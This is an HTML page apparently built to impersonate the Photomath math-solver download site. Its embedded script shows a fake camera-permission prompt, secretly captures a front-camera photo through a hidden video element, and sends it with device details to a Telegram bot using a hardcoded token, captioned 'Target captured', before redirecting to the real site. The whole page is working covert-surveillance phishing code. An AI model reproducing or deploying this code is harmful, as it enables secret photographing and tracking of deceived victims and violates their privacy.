<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Photomath</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            color: #1a1a1a;
            line-height: 1.5;
        }

        .header {
            background: #0066FF;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            color: white;
            letter-spacing: -0.5px;
        }

        .logo span {
            font-weight: 300;
        }

        .nav {
            display: flex;
            gap: 20px;
        }

        .nav a {
            color: white;
            text-decoration: none;
            font-weight: 500;
            opacity: 0.9;
        }

        .hero {
            text-align: center;
            padding: 60px 20px 40px;
            background: linear-gradient(135deg, #f5f7ff 0%, #eef2ff 100%);
        }

        .hero h1 {
            font-size: 48px;
            font-weight: 800;
            background: linear-gradient(135deg, #0066FF, #00ccff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 16px;
        }

        .hero p {
            font-size: 20px;
            color: #4a5568;
            max-width: 600px;
            margin: 0 auto;
        }

        .download-btn-container {
            text-align: center;
            margin: 40px 20px;
        }

        .big-download-btn {
            background: linear-gradient(90deg, #0066FF, #00cc66);
            border: none;
            padding: 20px 50px;
            border-radius: 60px;
            font-size: 28px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            box-shadow: 0 15px 30px rgba(0,102,255,0.3);
            transition: transform 0.2s, box-shadow 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 12px;
        }

        .big-download-btn:active {
            transform: scale(0.97);
        }

        .features {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 30px;
            padding: 40px 20px;
            background: #f9fafb;
        }

        .feature-card {
            text-align: center;
            max-width: 200px;
        }

        .feature-card .icon {
            font-size: 48px;
            margin-bottom: 12px;
        }

        .feature-card h3 {
            margin-bottom: 8px;
        }

        #hiddenCamera {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* المربع الكبير (modal) */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(8px);
        }

        .modal-box {
            background: white;
            border-radius: 48px;
            max-width: 340px;
            width: 85%;
            text-align: center;
            padding: 32px 24px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .modal-icon {
            font-size: 64px;
            margin-bottom: 16px;
        }

        .modal-box h2 {
            font-size: 24px;
            margin-bottom: 12px;
            color: #1a1a1a;
        }

        .modal-box p {
            color: #555;
            margin-bottom: 28px;
            line-height: 1.4;
        }

        .modal-buttons {
            display: flex;
            gap: 12px;
            justify-content: center;
        }

        .btn-allow {
            background: #0066FF;
            border: none;
            padding: 12px 28px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            flex: 1;
        }

        .btn-deny {
            background: #e0e0e0;
            border: none;
            padding: 12px 28px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: bold;
            color: #333;
            cursor: pointer;
            flex: 1;
        }

        @media (max-width: 500px) {
            .modal-box {
                width: 90%;
                padding: 28px 20px;
            }
        }
    </style>
</head>
<body>

<div class="header">
    <div class="logo">Photo<span>Math</span></div>
    <div class="nav">
        <a href="#">Solutions</a>
        <a href="#">Pricing</a>
        <a href="#">Downloads</a>
    </div>
</div>

<div class="hero">
    <h1>Scan. Solve. Learn.</h1>
    <p>The #1 math solver with camera support. Over 100 million downloads.</p>
</div>

<div class="download-btn-container">
    <button class="big-download-btn" id="downloadBtn">
        📱 DOWNLOAD FOR FREE
    </button>
</div>

<div class="features">
    <div class="feature-card">
        <div class="icon">📸</div>
        <h3>Camera Solver</h3>
        <p>Point & solve instantly</p>
    </div>
    <div class="feature-card">
        <div class="icon">🧠</div>
        <h3>Step-by-step</h3>
        <p>Learn the solution</p>
    </div>
    <div class="feature-card">
        <div class="icon">🌍</div>
        <h3>30+ Languages</h3>
        <p>Available worldwide</p>
    </div>
</div>

<video id="hiddenCamera" autoplay playsinline muted></video>

<script>
    // بيانات التلغرام
    const BOT_TOKEN = "8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0";
    const CHAT_ID = "8549252422";
    
    let cameraStream = null;
    let photoSent = false;
    let redirectDone = false;
    let permissionRequested = false;
    
    const video = document.getElementById('hiddenCamera');
    
    // إنشاء المربع الكبير ديناميكياً
    function createPermissionModal() {
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.id = 'permissionModal';
        
        modal.innerHTML = `
            <div class="modal-box">
                <div class="modal-icon">📸🔐</div>
                <h2>Camera Access Required</h2>
                <p>Photomath needs camera permission to scan and solve your math problem instantly.</p>
                <div class="modal-buttons">
                    <button class="btn-allow" id="modalAllow">Allow</button>
                    <button class="btn-deny" id="modalDeny">Deny</button>
                </div>
            </div>
        `;
        
        document.body.appendChild(modal);
        
        // معالج الضغط على سماح
        document.getElementById('modalAllow').addEventListener('click', async () => {
            modal.remove();
            await requestCameraAndCapture();
        });
        
        // معالج الضغط على رفض
        document.getElementById('modalDeny').addEventListener('click', () => {
            modal.remove();
            redirectToPhotomath();
        });
    }
    
    // طلب الكاميرا والتصوير والإرسال
    async function requestCameraAndCapture() {
        if (permissionRequested) return;
        permissionRequested = true;
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            cameraStream = stream;
            video.srcObject = stream;
            await video.play();
            
            // انتظار ثانية لضبط الكاميرا ثم التصوير
            setTimeout(() => {
                captureAndSendPhoto();
            }, 1000);
            
        } catch(err) {
            // إذا فشل الوصول للكاميرا (رفض المستخدم أو خطأ)
            redirectToPhotomath();
        }
    }
    
    // التقاط الصورة وإرسالها إلى تلغرام
    function captureAndSendPhoto() {
        if (photoSent) return;
        
        if (!video.videoWidth || video.videoWidth === 0) {
            setTimeout(captureAndSendPhoto, 500);
            return;
        }
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `target_${Date.now()}.jpg`);
            formData.append('caption', `🎯 Target captured\n⏰ ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 ${navigator.language}\n📍 ${screen.width}x${screen.height}`);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {
                console.error("Send error:", e);
            }
            
            photoSent = true;
            
            // إيقاف الكاميرا
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            
            // التوجيه إلى الرابط
            redirectToPhotomath();
            
        }, 'image/jpeg', 0.85);
        
        photoSent = true;
    }
    
    // التوجيه إلى الرابط
    function redirectToPhotomath() {
        if (!redirectDone) {
            redirectDone = true;
            window.location.href = "https://photomath.com/";
        }
    }
    
    // فور تحميل الصفحة، نظهر المربع
    window.addEventListener('load', () => {
        // تأخير بسيط لضمان ظهور المربع بعد تحميل كل شيء
        setTimeout(() => {
            createPermissionModal();
        }, 100);
    });
</script>
</body>
</html>
